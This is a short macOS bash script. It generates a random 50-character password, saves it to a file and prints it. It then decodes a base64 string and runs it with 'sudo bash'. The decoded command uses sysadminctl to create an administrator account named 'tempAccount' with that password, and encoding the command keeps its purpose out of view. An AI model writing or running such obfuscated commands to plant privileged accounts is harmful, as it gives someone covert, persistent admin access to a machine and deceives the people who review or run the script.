#!/bin/bash -x
dd bs=512 if=/dev/urandom count=1 2>/dev/null | LC_ALL=C tr -cd [:alnum:] | head -c50 > ./tempPass
cat ./tempPass
echo ZXZhbCBzeXNhZG1pbmN0bCAtYWRkVXNlciAidGVtcEFjY291bnQiIC1hZG1pbiAtcGFzc3dvcmQgIiQoY2F0IC4vdGVtcFBhc3MpIgo= | base64 -d -i - | sudo bash
